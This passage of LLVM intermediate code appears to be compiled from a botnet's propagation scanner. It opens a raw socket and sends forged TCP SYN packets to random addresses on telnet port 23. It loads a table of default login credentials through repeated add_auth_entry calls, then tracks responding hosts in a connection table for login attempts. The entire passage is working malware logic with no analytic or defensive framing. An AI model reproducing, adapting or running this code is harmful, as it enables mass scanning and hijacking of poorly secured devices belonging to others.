79:                                               ; preds = %76
  br label %80

80:                                               ; preds = %79, %76
  %81 = load i32, i32* @rsck, align 4
  %82 = load i32, i32* @rsck, align 4
  %83 = call i32 (i32, i32, ...) @fcntl(i32 noundef %82, i32 noundef 3, i32 noundef 0)
  %84 = or i32 2048, %83
  %85 = call i32 (i32, i32, ...) @fcntl(i32 noundef %81, i32 noundef 4, i32 noundef %84)
  store i32 1, i32* %1, align 4
  %86 = load i32, i32* @rsck, align 4
  %87 = bitcast i32* %1 to i8*
  %88 = call i32 @setsockopt(i32 noundef %86, i32 noundef 0, i32 noundef 3, i8* noundef %87, i32 noundef 4) #7
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %80
  %91 = load i32, i32* @rsck, align 4
  %92 = call i32 @close(i32 noundef %91)
  br label %93

93:                                               ; preds = %90, %80
  br label %94

94:                                               ; preds = %98, %93
  %95 = call i32 @rand_next()
  %96 = and i32 %95, 65535
  %97 = trunc i32 %96 to i16
  store i16 %97, i16* %2, align 2
  br label %98

98:                                               ; preds = %94
  %99 = load i16, i16* %2, align 2
  %100 = call zeroext i16 @ntohs(i16 noundef zeroext %99) #8
  %101 = zext i16 %100 to i32
  %102 = icmp slt i32 %101, 1024
  br i1 %102, label %94, label %103, !llvm.loop !43

103:                                              ; preds = %98
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %104 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i64 1
  %106 = bitcast %struct.iphdr* %105 to %struct.tcphdr*
  store %struct.tcphdr* %106, %struct.tcphdr** %4, align 8
  %107 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = load i8, i8* %108, align 4
  %110 = and i8 %109, -16
  %111 = or i8 %110, 5
  store i8 %111, i8* %108, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = bitcast %struct.iphdr* %112 to i8*
  %114 = load i8, i8* %113, align 4
  %115 = and i8 %114, 15
  %116 = or i8 %115, 64
  store i8 %116, i8* %113, align 4
  %117 = call zeroext i16 @htons(i16 noundef zeroext 40) #8
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 2
  store i16 %117, i16* %119, align 2
  %120 = call i32 @rand_next()
  %121 = trunc i32 %120 to i16
  %122 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 3
  store i16 %121, i16* %123, align 4
  %124 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 5
  store i8 64, i8* %125, align 4
  %126 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 6
  store i8 6, i8* %127, align 1
  %128 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %129 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 1
  store i16 %128, i16* %130, align 2
  %131 = load i16, i16* %2, align 2
  %132 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 0
  store i16 %131, i16* %133, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 4
  %136 = load i16, i16* %135, align 4
  %137 = and i16 %136, -241
  %138 = or i16 %137, 80
  store i16 %138, i16* %135, align 4
  %139 = call i32 @rand_next()
  %140 = and i32 %139, 65535
  %141 = trunc i32 %140 to i16
  %142 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 5
  store i16 %141, i16* %143, align 2
  %144 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -513
  %148 = or i16 %147, 512
  store i16 %148, i16* %145, align 4
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 7)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i16 noundef zeroext 14)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i16 noundef zeroext 13)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i16 noundef zeroext 12)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i16 noundef zeroext 11)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0), i16 noundef zeroext 16)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0), i16 noundef zeroext 11)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i16 noundef zeroext 13)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0), i16 noundef zeroext 12)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 5)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i64 0, i64 0), i16 noundef zeroext 11)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 4)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0), i16 noundef zeroext 8)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 5)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i64 0, i64 0), i16 noundef zeroext 14)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i16 noundef zeroext 13)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 6)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i16 noundef zeroext 8)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 3)
  br label %149

149:                                              ; preds = %959, %103
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %150 = load i32, i32* @fake_time, align 4
  %151 = load i32, i32* %10, align 4
  %152 = icmp ne i32 %150, %151
  br i1 %152, label %153, label %217

153:                                              ; preds = %149
  %154 = load i32, i32* @fake_time, align 4
  store i32 %154, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %155

155:                                              ; preds = %213, %153
  %156 = load i32, i32* %1, align 4
  %157 = icmp slt i32 %156, 384
  br i1 %157, label %158, label %216

158:                                              ; preds = %155
  %159 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %159, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %160 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i64 1
  %162 = bitcast %struct.iphdr* %161 to %struct.tcphdr*
  store %struct.tcphdr* %162, %struct.tcphdr** %16, align 8
  %163 = call i32 @rand_next()
  %164 = trunc i32 %163 to i16
  %165 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i32, i32* @LOCAL_ADDR, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = call i32 @get_random_ip()
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  store i32 %170, i32* %172, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 7
  store i16 0, i16* %174, align 2
  %175 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %176 = bitcast %struct.iphdr* %175 to i16*
  %177 = call zeroext i16 @checksum_generic(i16* noundef %176, i32 noundef 20)
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 7
  store i16 %177, i16* %179, align 2
  %180 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %181 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 9
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 6
  store i16 0, i16* %189, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %191 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %192 = bitcast %struct.tcphdr* %191 to i8*
  %193 = call zeroext i16 @htons(i16 noundef zeroext 20) #8
  %194 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %190, i8* noundef %192, i16 noundef zeroext %193, i32 noundef 20)
  %195 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 6
  store i16 %194, i16* %196, align 4
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %197, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 9
  %200 = load i32, i32* %199, align 4
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %202 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %201, i32 0, i32 0
  store i32 %200, i32* %202, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 1
  %205 = load i16, i16* %204, align 2
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %205, i16* %206, align 2
  %207 = load i32, i32* @rsck, align 4
  %208 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %209 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %209, %struct.sockaddr** %208, align 8
  %210 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %211 = load %struct.sockaddr*, %struct.sockaddr** %210, align 8
  %212 = call i64 @sendto(i32 noundef %207, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), i64 noundef 40, i32 noundef 16384, %struct.sockaddr* %211, i32 noundef 16)
  br label %213

213:                                              ; preds = %158
  %214 = load i32, i32* %1, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %1, align 4
  br label %155, !llvm.loop !44

216:                                              ; preds = %155
  br label %217

217:                                              ; preds = %216, %149
  store i32 0, i32* %9, align 4
  br label %218

218:                                              ; preds = %351, %323, %311, %303, %295, %287, %279, %270, %261, %254, %247, %217
  %219 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %220 = bitcast i8* %219 to %struct.iphdr*
  store %struct.iphdr* %220, %struct.iphdr** %20, align 8
  %221 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i64 1
  %223 = bitcast %struct.iphdr* %222 to %struct.tcphdr*
  store %struct.tcphdr* %223, %struct.tcphdr** %21, align 8
  %224 = call i32* @__errno_location() #8
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* @rsck, align 4
  %226 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %227 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %227, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i64 @recvfrom(i32 noundef %225, i8* noundef %226, i64 noundef 1514, i32 noundef 16384, %struct.sockaddr* %229, i32* noundef null)
  %231 = trunc i64 %230 to i32
  store i32 %231, i32* %18, align 4
  %232 = load i32, i32* %18, align 4
  %233 = icmp sle i32 %232, 0
  br i1 %233, label %242, label %234

234:                                              ; preds = %218
  %235 = call i32* @__errno_location() #8
  %236 = load i32, i32* %235, align 4
  %237 = icmp eq i32 %236, 11
  br i1 %237, label %242, label %238

238:                                              ; preds = %234
  %239 = call i32* @__errno_location() #8
  %240 = load i32, i32* %239, align 4
  %241 = icmp eq i32 %240, 11
  br i1 %241, label %242, label %243

242:                                              ; preds = %238, %234, %218
  br label %363

243:                                              ; preds = %238
  %244 = load i32, i32* %18, align 4
  %245 = sext i32 %244 to i64
  %246 = icmp ult i64 %245, 40
  br i1 %246, label %247, label %248

247:                                              ; preds = %243
  br label %218

248:                                              ; preds = %243
  %249 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 9
  %251 = load i32, i32* %250, align 4
  %252 = load i32, i32* @LOCAL_ADDR, align 4
  %253 = icmp ne i32 %251, %252
  br i1 %253, label %254, label %255

254:                                              ; preds = %248
  br label %218

255:                                              ; preds = %248
  %256 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 6
  %258 = load i8, i8* %257, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp ne i32 %259, 6
  br i1 %260, label %261, label %262

261:                                              ; preds = %255
  br label %218

262:                                              ; preds = %255
  %263 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 0
  %265 = load i16, i16* %264, align 4
  %266 = zext i16 %265 to i32
  %267 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %268 = zext i16 %267 to i32
  %269 = icmp ne i32 %266, %268
  br i1 %269, label %270, label %271

270:                                              ; preds = %262
  br label %218

271:                                              ; preds = %262
  %272 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 1
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = load i16, i16* %2, align 2
  %277 = zext i16 %276 to i32
  %278 = icmp ne i32 %275, %277
  br i1 %278, label %279, label %280

279:                                              ; preds = %271
  br label %218

280:                                              ; preds = %271
  %281 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 4
  %283 = load i16, i16* %282, align 4
  %284 = lshr i16 %283, 9
  %285 = and i16 %284, 1
  %286 = icmp ne i16 %285, 0
  br i1 %286, label %288, label %287

287:                                              ; preds = %280
  br label %218

288:                                              ; preds = %280
  %289 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = lshr i16 %291, 12
  %293 = and i16 %292, 1
  %294 = icmp ne i16 %293, 0
  br i1 %294, label %296, label %295

295:                                              ; preds = %288
  br label %218

296:                                              ; preds = %288
  %297 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = lshr i16 %299, 10
  %301 = and i16 %300, 1
  %302 = icmp ne i16 %301, 0
  br i1 %302, label %303, label %304

303:                                              ; preds = %296
  br label %218

304:                                              ; preds = %296
  %305 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 4
  %307 = load i16, i16* %306, align 4
  %308 = lshr i16 %307, 8
  %309 = and i16 %308, 1
  %310 = icmp ne i16 %309, 0
  br i1 %310, label %311, label %312

311:                                              ; preds = %304
  br label %218

312:                                              ; preds = %304
  %313 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 3
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 noundef %315) #8
  %317 = sub i32 %316, 1
  %318 = call i32 @htonl(i32 noundef %317) #8
  %319 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  %321 = load i32, i32* %320, align 4
  %322 = icmp ne i32 %318, %321
  br i1 %322, label %323, label %324

323:                                              ; preds = %312
  br label %218

324:                                              ; preds = %312
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %325 = load i32, i32* %9, align 4
  store i32 %325, i32* %18, align 4
  br label %326

326:                                              ; preds = %344, %324
  %327 = load i32, i32* %18, align 4
  %328 = icmp slt i32 %327, 256
  br i1 %328, label %329, label %347

329:                                              ; preds = %326
  %330 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %331 = load i32, i32* %18, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %330, i64 %332
  %334 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %333, i32 0, i32 3
  %335 = load i32, i32* %334, align 8
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %337, label %343

337:                                              ; preds = %329
  %338 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %339 = load i32, i32* %18, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %338, i64 %340
  store %struct.scanner_connection* %341, %struct.scanner_connection** %22, align 8
  %342 = load i32, i32* %18, align 4
  store i32 %342, i32* %9, align 4
  br label %347

343:                                              ; preds = %329
  br label %344

344:                                              ; preds = %343
  %345 = load i32, i32* %18, align 4
  %346 = add nsw i32 %345, 1
  store i32 %346, i32* %18, align 4
  br label %326, !llvm.loop !45

347:                                              ; preds = %337, %326
  %348 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %349 = icmp eq %struct.scanner_connection* %348, null
  br i1 %349, label %350, label %351

350:                                              ; preds = %347
  br label %363

351:                                              ; preds = %347
  %352 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 8
  %354 = load i32, i32* %353, align 4
  %355 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %356 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %355, i32 0, i32 4
  store i32 %354, i32* %356, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 0
  %359 = load i16, i16* %358, align 4
  %360 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %361 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %360, i32 0, i32 5
  store i16 %359, i16* %361, align 8
  %362 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %362)
  br label %218

363:                                              ; preds = %350, %242
  br label %364

364:                                              ; preds = %363
  store %struct.fd_set.26* %5, %struct.fd_set.26** %25, align 8
  store i32 0, i32* %24, align 4
  br label %365

365:                                              ; preds = %375, %364
  %366 = load i32, i32* %24, align 4
  %367 = zext i32 %366 to i64
  %368 = icmp ult i64 %367, 16
  br i1 %368, label %369, label %378

369:                                              ; preds = %365
  %370 = load %struct.fd_set.26*, %struct.fd_set.26** %25, align 8
  %371 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %370, i32 0, i32 0
  %372 = load i32, i32* %24, align 4
  %373 = zext i32 %372 to i64
  %374 = getelementptr inbounds [16 x i64], [16 x i64]* %371, i64 0, i64 %373
  store i64 0, i64* %374, align 8
  br label %375

375:                                              ; preds = %369
  %376 = load i32, i32* %24, align 4
  %377 = add i32 %376, 1
  store i32 %377, i32* %24, align 4
  br label %365, !llvm.loop !46

378:                                              ; preds = %365
  br label %379

379:                                              ; preds = %378
  br label %380

380:                                              ; preds = %379
  store %struct.fd_set.26* %6, %struct.fd_set.26** %27, align 8
  store i32 0, i32* %26, align 4
  br label %381

381:                                              ; preds = %391, %380
  %382 = load i32, i32* %26, align 4
  %383 = zext i32 %382 to i64
  %384 = icmp ult i64 %383, 16
  br i1 %384, label %385, label %394

385:                                              ; preds = %381
  %386 = load %struct.fd_set.26*, %struct.fd_set.26** %27, align 8
  %387 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %386, i32 0, i32 0
  %388 = load i32, i32* %26, align 4
  %389 = zext i32 %388 to i64
  %390 = getelementptr inbounds [16 x i64], [16 x i64]* %387, i64 0, i64 %389
  store i64 0, i64* %390, align 8
  br label %391

391:                                              ; preds = %385
  %392 = load i32, i32* %26, align 4
  %393 = add i32 %392, 1
  store i32 %393, i32* %26, align 4
  br label %381, !llvm.loop !47

394:                                              ; preds = %381
  br label %395

395:                                              ; preds = %394
  store i32 0, i32* %1, align 4
  br label %396

396:                                              ; preds = %518, %395
  %397 = load i32, i32* %1, align 4
  %398 = icmp slt i32 %397, 256
  br i1 %398, label %399, label %521

399:                                              ; preds = %396
  %400 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %401 = load i32, i32* %1, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %400, i64 %402
  store %struct.scanner_connection* %403, %struct.scanner_connection** %7, align 8
  %404 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
